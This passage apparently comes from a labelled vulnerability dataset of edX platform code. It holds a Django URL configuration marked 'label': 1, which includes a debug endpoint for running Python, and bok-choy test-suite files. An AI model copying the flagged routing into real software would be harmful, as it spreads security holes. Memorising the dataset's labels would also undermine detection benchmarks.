key.lower(),\n                        'static_template_view.views.render',\n                        {'template': template}, name=value),)\n\n\nif settings.PERFSTATS:\n    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)\n\n# Multicourse wiki (Note: wiki urls must be above the courseware ones because of\n# the custom tab catch-all)\nif settings.WIKI_ENABLED:\n    from wiki.urls import get_pattern as wiki_pattern\n    from django_notify.urls import get_pattern as notify_pattern\n\n    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update\n    # them together.\n    urlpatterns += (\n        # First we include views from course_wiki that we use to override the default views.\n        # They come first in the urlpatterns so they get resolved first\n        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),\n        url(r'^wiki/', include(wiki_pattern())),\n        url(r'^notify/', include(notify_pattern())),\n\n        # These urls are for viewing the wiki in the context of a course. They should\n        # never be returned by a reverse() so they come after the other url patterns\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',\n            'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"),\n        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),\n    )\n\n\nif settings.COURSEWARE_ENABLED:\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',\n            'courseware.views.jump_to', name=\"jump_to\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.modx_dispatch',\n            name='modx_dispatch'),\n\n\n        # Software Licenses\n\n        # TODO: for now, this is the endpoint of an ajax replay\n        # service that retrieve and assigns license numbers for\n        # software assigned to a course. The numbers have to be loaded\n        # into the database.\n        url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.xqueue_callback',\n            name='xqueue_callback'),\n        url(r'^change_setting$', 'student.views.change_setting',\n            name='change_setting'),\n\n        # TODO: These views need to be updated before they work\n        url(r'^calculate$', 'util.views.calculate'),\n        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki\n        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),\n        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),\n\n        url(r'^courses/?$', 'branding.views.courses', name=\"courses\"),\n        url(r'^change_enrollment$',\n            'student.views.change_enrollment', name=\"change_enrollment\"),\n\n        #About the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',\n            'courseware.views.course_about', name=\"about_course\"),\n        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n        #View for mktg site\n        url(r'^mktg/(?P<course_id>.*)$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n\n\n\n        #Inside the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'courseware.views.course_info', name=\"course_root\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',\n            'courseware.views.course_info', name=\"info\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n            'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',\n            'staticbook.views.index', name=\"book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.index'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',\n            'staticbook.views.html_index', name=\"html_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n            'staticbook.views.html_index', name=\"html_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n            'courseware.views.index', name=\"courseware\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_chapter\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_section\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',\n            'courseware.views.index', name=\"courseware_position\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',\n            'courseware.views.progress', name=\"progress\"),\n        # Takes optional student_id for instructor use--shows profile as that student sees it.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',\n            'courseware.views.progress', name=\"student_progress\"),\n\n        # For the instructor\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',\n            'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',\n            'instructor.views.gradebook', name='gradebook'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',\n            'instructor.views.grade_summary', name='grade_summary'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',\n            'open_ended_grading.views.staff_grading', name='staff_grading'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',\n            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',\n            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),\n\n        # Open Ended problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',\n            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),\n\n        # Open Ended flagged problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',\n            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',\n            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),\n\n        # Cohorts management\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',\n            'course_groups.views.list_cohorts', name=\"cohorts\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',\n            'course_groups.views.add_cohort',\n            name=\"add_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',\n            'course_groups.views.users_in_cohort',\n            name=\"list_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',\n            'course_groups.views.add_users_to_cohort',\n            name=\"add_to_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',\n            'course_groups.views.remove_user_from_cohort',\n            name=\"remove_from_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',\n            'course_groups.views.debug_cohort_mgmt',\n            name=\"debug_cohort_mgmt\"),\n\n        # Open Ended Notifications\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',\n            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',\n            'open_ended_grading.views.peer_grading', name='peer_grading'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),\n\n    )\n\n    # allow course staff to change to student view of courseware\n    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):\n        urlpatterns += (\n            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"),\n        )\n\n    # discussion forums live within courseware, so courseware must be enabled first\n    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',\n                'courseware.views.news', name=\"news\"),\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',\n                include('django_comment_client.urls'))\n        )\n    urlpatterns += (\n        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',\n        'courseware.views.static_tab', name=\"static_tab\"),\n    )\n\n    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',\n                'courseware.views.submission_history',\n                name='submission_history'),\n        )\n\n\nif settings.ENABLE_JASMINE:\n    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)\n\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    ## Jasmine and admin\n    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID'):\n    urlpatterns += (\n        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),\n        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),\n        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),\n    )\n\nif settings.MITX_FEATURES.get('AUTH_USE_SHIB'):\n    urlpatterns += (\n        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),\n    )\n\nif settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):\n    urlpatterns += (\n        url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_login', name='course-specific-login'),\n        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_register', name='course-specific-register'),\n\n    )\n\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):\n    urlpatterns += (\n        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),\n        url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),\n        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),\n        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):\n    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),\n\nif settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):\n    urlpatterns += (\n        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),\n        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):\n    urlpatterns += (\n        url(r'^event_logs$', 'track.views.view_tracking_log'),\n        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):\n    urlpatterns += (\n        url(r'^status/', include('service_status.urls')),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):\n    urlpatterns += (\n        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),\n    )\n\nif settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):\n    urlpatterns += (\n        url(r'^edinsights_service/', include('edinsights.core.urls')),\n    )\n    import edinsights.core.registry\n\n# FoldIt views\nurlpatterns += (\n    # The path is hardcoded into their app...\n    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"),\n)\n\nif settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):\n    urlpatterns += (\n        url(r'^debug/run_python', 'debug.views.run_python'),\n    )\n\n# Crowdsourced hinting instructor manager.\nif settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',\n            'instructor.hint_manager.hint_manager', name=\"hint_manager\"),\n    )\n\nurlpatterns = patterns(*urlpatterns)\n\nif settings.DEBUG:\n    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)\n\n#Custom error pages\nhandler404 = 'static_template_view.views.render_404'\nhandler500 = 'static_template_view.views.render_500'\n/n/n/n", "label": 1}, {"id": "1162dbc18fda91b07a5942873387d60fd67b2cfc", "code": "pavelib/paver_tests/test_paver_bok_choy_cmds.py/n/n\"\"\"\nTests for the bok-choy paver commands themselves.\nRun just this test with: paver test_lib -t pavelib/paver_tests/test_paver_bok_choy_cmds.py\n\"\"\"\nimport os\nimport unittest\n\nfrom mock import patch, call\nfrom test.test_support import EnvironmentVarGuard\nfrom paver.easy import BuildFailure\nfrom pavelib.utils.test.suites import BokChoyTestSuite, Pa11yCrawler\n\nREPO_DIR = os.getcwd()\n\n\nclass TestPaverBokChoyCmd(unittest.TestCase):\n    \"\"\"\n    Paver Bok Choy Command test cases\n    \"\"\"\n\n    def _expected_command(self, name, store=None, verify_xss=True):\n        \"\"\"\n        Returns the command that is expected to be run for the given test spec\n        and store.\n        \"\"\"\n\n        expected_statement = (\n            \"DEFAULT_STORE={default_store} \"\n            \"SCREENSHOT_DIR='{repo_dir}/test_root/log{shard_str}' \"\n            \"BOK_CHOY_HAR_DIR='{repo_dir}/test_root/log{shard_str}/hars' \"\n            \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{repo_dir}/{a11y_custom_file}' \"\n            \"SELENIUM_DRIVER_LOG_DIR='{repo_dir}/test_root/log{shard_str}' \"\n            \"VERIFY_XSS='{verify_xss}' \"\n            \"nosetests {repo_dir}/common/test/acceptance/{exp_text} \"\n            \"--with-xunit \"\n            \"--xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml \"\n            \"--verbosity=2 \"\n        ).format(\n            default_store=store,\n            repo_dir=REPO_DIR,\n            shard_str='/shard_' + self.shard if self.shard else '',\n            exp_text=name,\n            a11y_custom_file='node_modules/edx-custom-a11y-rules/lib/custom_a11y_rules.js',\n            verify_xss=verify_xss\n        )\n        return expected_statement\n\n    def setUp(self):\n        super(TestPaverBokChoyCmd, self).setUp()\n        self.shard = os.environ.get('SHARD')\n        self.env_var_override = EnvironmentVarGuard()\n\n    def test_default(self):\n        suite = BokChoyTestSuite('')\n        name = 'tests'\n        self.assertEqual(suite.cmd, self._expected_command(name=name))\n\n    def test_suite_spec(self):\n        spec = 'test_foo.py'\n        suite = BokChoyTestSuite('', test_spec=spec)\n        name = 'tests/{}'.format(spec)\n        self.assertEqual(suite.cmd, self._expected_command(name=name))\n\n    def test_class_spec(self):\n        spec = 'test_foo.py:FooTest'\n        suite = BokChoyTestSuite('', test_spec=spec)\n        name = 'tests/{}'.format(spec)\n        self.assertEqual(suite.cmd, self._expected_command(name=name))\n\n    def test_testcase_spec(self):\n        spec = 'test_foo.py:FooTest.test_bar'\n        suite = BokChoyTestSuite('', test_spec=spec)\n        name = 'tests/{}'.format(spec)\n        self.assertEqual(suite.cmd, self._expected_command(name=name))\n\n    def test_spec_with_draft_default_store(self):\n        spec = 'test_foo.py'\n        suite = BokChoyTestSuite('', test_spec=spec, default_store='draft')\n        name = 'tests/{}'.format(spec)\n        self.assertEqual(\n            suite.cmd,\n            self._expected_command(name=name, store='draft')\n        )\n\n    def test_invalid_default_store(self):\n        # the cmd will dumbly compose whatever we pass in for the default_store\n        suite = BokChoyTestSuite('', default_store='invalid')\n        name = 'tests'\n        self.assertEqual(\n            suite.cmd,\n            self._expected_command(name=name, store='invalid')\n        )\n\n    def test_serversonly(self):\n        suite = BokChoyTestSuite('', serversonly=True)\n        self.assertEqual(suite.cmd, \"\")\n\n    def test_verify_xss(self):\n        suite = BokChoyTestSuite('', verify_xss=True)\n        name = 'tests'\n        self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))\n\n    def test_verify_xss_env_var(self):\n        self.env_var_override.set('VERIFY_XSS', 'False')\n        with self.env_var_override:\n            suite = BokChoyTestSuite('')\n            name = 'tests'\n            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=False))\n\n    def test_test_dir(self):\n        test_dir = 'foo'\n        suite = BokChoyTestSuite('', test_dir=test_dir)\n        self.assertEqual(\n            suite.cmd,\n            self._expected_command(name=test_dir)\n        )\n\n    def test_verbosity_settings_1_process(self):\n        \"\"\"\n        Using 1 process means paver should ask for the traditional xunit plugin for plugin results\n        \"\"\"\n        expected_verbosity_string = (\n            \"--with-xunit --xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml --verbosity=2\".format(\n                repo_dir=REPO_DIR,\n                shard_str='/shard_' + self.shard if self.shard else ''\n            )\n        )\n        suite = BokChoyTestSuite('', num_processes=1)\n        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)\n\n    def test_verbosity_settings_2_processes(self):\n        \"\"\"\n        Using multiple processes means specific xunit, coloring, and process-related settings should\n        be used.\n        \"\"\"\n        process_count = 2\n        expected_verbosity_string = (\n            \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\"\n            \" --processes={procs} --no-color --process-timeout=1200\".format(\n                repo_dir=REPO_DIR,\n                shard_str='/shard_' + self.shard if self.shard else '',\n                procs=process_count\n            )\n        )\n        suite = BokChoyTestSuite('', num_processes=process_count)\n        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)\n\n    def test_verbosity_settings_3_processes(self):\n        \"\"\"\n        With the above test, validate that num_processes can be set to various values\n        \"\"\"\n        process_count = 3\n        expected_verbosity_string = (\n            \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\"\n            \" --processes={procs} --no-color --process-timeout=1200\".format(\n                repo_dir=REPO_DIR,\n                shard_str='/shard_' + self.shard if self.shard else '',\n                procs=process_count\n            )\n        )\n        suite = BokChoyTestSuite('', num_processes=process_count)\n        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)\n\n    def test_invalid_verbosity_and_processes(self):\n        \"\"\"\n        If an invalid combination of verbosity and number of processors is passed in, a\n        BuildFailure should be raised\n        \"\"\"\n        suite = BokChoyTestSuite('', num_processes=2, verbosity=3)\n        with self.assertRaises(BuildFailure):\n            BokChoyTestSuite.verbosity_processes_string(suite)\n\n\nclass TestPaverPa11yCrawlerCmd(unittest.TestCase):\n\n    \"\"\"\n    Paver pa11ycrawler command test cases.  Most of the functionality is\n    inherited from BokChoyTestSuite, so those tests aren't duplicated.\n    \"\"\"\n\n    def setUp(self):\n        super(TestPaverPa11yCrawlerCmd, self).setUp()\n\n        # Mock shell commands\n        mock_sh = patch('pavelib.utils.test.suites.bokchoy_suite.sh')\n        self._mock_sh = mock_sh.start()\n\n        # Cleanup mocks\n        self.addCleanup(mock_sh.stop)\n\n    def _expected_command(self, report_dir, start_urls):\n        \"\"\"\n        Returns the expected command to run pa11ycrawler.\n        \"\"\"\n        expected_statement = (\n            'pa11ycrawler run {start_urls} '\n            '--pa11ycrawler-allowed-domains=localhost '\n            '--pa11ycrawler-reports-dir={report_dir} '\n            '--pa11ycrawler-deny-url-matcher=logout '\n            '--pa11y-reporter=\"1.0-json\" '\n            '--depth-limit=6 '\n        ).format(\n            start_urls=' '.join(start_urls),\n            report_dir=report_dir,\n        )\n        return expected_statement\n\n    def test_default(self):\n        suite = Pa11yCrawler('')\n        self.assertEqual(\n            suite.cmd,\n            self._expected_command(suite.pa11y_report_dir, suite.start_urls)\n        )\n\n    def test_get_test_course(self):\n        suite = Pa11yCrawler('')\n        suite.get_test_course()\n        self._mock_sh.assert_has_calls([\n            call(\n                'wget {targz} -O {dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir)),\n            call(\n                'tar zxf {dir}demo_course.tar.gz -C {dir}'.format(dir=suite.imports_dir)),\n        ])\n\n    def test_generate_html_reports(self):\n        suite = Pa11yCrawler('')\n        suite.generate_html_reports()\n        self._mock_sh.assert_has_calls([\n            call(\n                'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={}'.format(suite.pa11y_report_dir)),\n        ])\n/n/n/npavelib/utils/test/suites/bokchoy_suite.py/n/n\"\"\"\nClass used for defining and running Bok Choy acceptance test suite\n\"\"\"\nfrom time import sleep\nfrom urllib import urlencode\n\nfrom common.test.acceptance.fixtures.course import CourseFixture, FixtureError\n\nfrom path import Path as path\nfrom paver.easy import sh, BuildFailure\nfrom pavelib.utils.test.suites.suite import TestSuite\nfrom pavelib.utils.envs import Env\nfrom pavelib.utils.test import bokchoy_utils\nfrom pavelib.utils.test import utils as test_utils\n\nimport os\n\ntry:\n    from pygments.console import colorize\nexcept ImportError:\n    colorize = lambda color, text: text\n\n__test__ = False  # do not collect\n\nDEFAULT_NUM_PROCESSES = 1\nDEFAULT_VERBOSITY = 2\n\n\nclass BokChoyTestSuite(TestSuite):\n    \"\"\"\n    TestSuite for running Bok Choy tests\n    Properties (below is a subset):\n      test_dir - parent directory for tests\n      log_dir - directory for test output\n      report_dir - directory for reports (e.g., coverage) related to test execution\n      xunit_report - directory for xunit-style output (xml)\n      fasttest - when set, skip various set-up tasks (e.g., collectstatic)\n      serversonly - prepare and run the necessary servers, only stopping when interrupted with Ctrl-C\n      testsonly - assume servers are running (as per above) and run tests with no setup or cleaning of environment\n      test_spec - when set, specifies test files, classes, cases, etc. See platform doc.\n      default_store - modulestore to use when running tests (split or draft)\n      num_processes - number of processes or threads to use in tests. Recommendation is that this\n      is less than or equal to the number of available processors.\n      verify_xss - when set, check for XSS vulnerabilities in the page HTML.\n      See nosetest documentation: http://nose.readthedocs.org/en/latest/usage.html\n    \"\"\"\n    def __init__(self, *args, **kwargs):\n        super(BokChoyTestSuite, self).__init__(*args, **kwargs)\n        self.test_dir = Env.BOK_CHOY_DIR / kwargs.get('test_dir', 'tests')\n        self.log_dir = Env.BOK_CHOY_LOG_DIR\n        self.report_dir = kwargs.get('report_dir', Env.BOK_CHOY_REPORT_DIR)\n        self.xunit_report = self.report_dir / \"xunit.xml\"\n        self.cache = Env.BOK_CHOY_CACHE\n        self.fasttest = kwargs.get('fasttest', False)\n        self.serversonly = kwargs.get('serversonly', False)\n        self.testsonly = kwargs.get('testsonly', False)\n        self.test_spec = kwargs.get('test_spec', None)\n        self.default_store = kwargs.get('default_store', None)\n        self.verbosity = kwargs.get('verbosity', DEFAULT_VERBOSITY)\n        self.num_processes = kwargs.get('num_processes', DEFAULT_NUM_PROCESSES)\n        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', True))\n        self.extra_args = kwargs.get('extra_args', '')\n        self.har_dir = self.log_dir / 'hars'\n        self.a11y_file = Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE\n        self.imports_dir = kwargs.get('imports_dir', None)\n        self.coveragerc = kwargs.get('coveragerc', None)\n        self.save_screenshots = kwargs.get('save_screenshots', False)\n\n    def __enter__(self):\n        super(BokChoyTestSuite, self).__enter__()\n\n        # Ensure that we have a directory to put logs and reports\n        self.log_dir.makedirs_p()\n        self.har_dir.makedirs_p()\n        self.report_dir.makedirs_p()\n        test_utils.clean_reports_dir()      # pylint: disable=no-value-for-parameter\n\n        if not (self.fasttest or self.skip_clean or self.testsonly):\n            test_utils.clean_test_files()\n\n        msg = colorize('green', \"Checking for mongo, memchache, and mysql...\")\n        print msg\n        bokchoy_utils.check_services()\n\n        if not self.testsonly:\n            self.prepare_bokchoy_run()\n        else:\n            # load data in db_fixtures\n            self.load_data()\n\n        msg = colorize('green', \"Confirming servers have started...\")\n        print msg\n        bokchoy_utils.wait_for_test_servers()\n        try:\n            # Create course in order to seed forum data underneath. This is\n            # a workaround for a race condition. The first time a course is created;\n            # role permissions are set up for forums.\n            CourseFixture('foobar_org', '1117', 'seed_forum', 'seed_foo').install()\n            print 'Forums permissions/roles data has been seeded'\n        except FixtureError:\n            # this means it's already been done\n            pass\n\n        if self.serversonly:\n            self.run_servers_continuously()\n\n    def __exit__(self, exc_type, exc_value, traceback):\n        super(BokChoyTestSuite, self).__exit__(exc_type, exc_value, traceback)\n\n        # Using testsonly will leave all fixtures in place (Note: the db will also be dirtier.)\n        if self.testsonly:\n            msg = colorize('green', 'Running in testsonly mode... SKIPPING database cleanup.')\n            print msg\n        else:\n            # Clean up data we created in the databases\n            msg = colorize('green', \"Cleaning up databases...\")\n            print msg\n            sh(\"./manage.py lms --settings bok_choy flush --traceback --noinput\")\n            bokchoy_utils.clear_mongo()\n\n    def verbosity_processes_string(self):\n        \"\"\"\n        Multiprocessing, xunit, color, and verbosity do not work well together. We need to construct\n        the proper combination for use with nosetests.\n        \"\"\"\n        substring = []\n\n        if self.verbosity != DEFAULT_VERBOSITY and self.num_processes != DEFAULT_NUM_PROCESSES:\n            msg = 'Cannot pass in both num_processors and verbosity. Quitting'\n            raise BuildFailure(msg)\n\n        if self.num_processes != 1:\n            # Construct \"multiprocess\" nosetest substring\n            substring = [\n                \"--with-xunitmp --xunitmp-file={}\".format(self.xunit_report),\n                \"--processes={}\".format(self.num_processes),\n                \"--no-color --process-timeout=1200\"\n            ]\n\n        else:\n            substring = [\n                \"--with-xunit\",\n                \"--xunit-file={}\".format(self.xunit_report),\n                \"--verbosity={}\".format(self.verbosity),\n            ]\n\n        return \" \".join(substring)\n\n    def prepare_bokchoy_run(self):\n        \"\"\"\n        Sets up and starts servers for a Bok Choy run. If --fasttest is not\n        specified then static assets are collected\n        \"\"\"\n        sh(\"{}/scripts/reset-test-db.sh\".format(Env.REPO_ROOT))\n\n        if not self.fasttest:\n            self.generate_optimized_static_assets()\n\n        # Clear any test data already in Mongo or MySQLand invalidate\n        # the cache\n        bokchoy_utils.clear_mongo()\n        self.cache.flush_all()\n\n        # load data in db_fixtures\n        self.load_data()\n\n        # load courses if self.imports_dir is set\n        self.load_courses()\n\n        # Ensure the test servers are available\n        msg = colorize('green', \"Confirming servers are running...\")\n        print msg\n        bokchoy_utils.start_servers(self.default_store, self.coveragerc)\n\n    def load_courses(self):\n        \"\"\"\n        Loads courses from self.imports_dir.\n\n        Note: self.imports_dir is the directory that contains the directories\n        that have courses in them. For example, if the course is located in\n        `test_root/courses/test-example-course/`, self.imports_dir should be\n        `test_root/courses/`.\n        \"\"\"\n        msg = colorize('green', \"Importing courses from {}...\".format(self.imports_dir))\n        print msg\n\n        if self.imports_dir:\n            sh(\n                \"DEFAULT_STORE={default_store}\"\n                \" ./manage.py cms --settings=bok_choy import {import_dir}\".format(\n                    default_store=self.default_store,\n                    import_dir=self.imports_dir\n                )\n            )\n\n    def load_data(self):\n        \"\"\"\n        Loads data into database from db_fixtures\n        \"\"\"\n        print 'Loading data from json fixtures in db_fixtures directory'\n        sh(\n            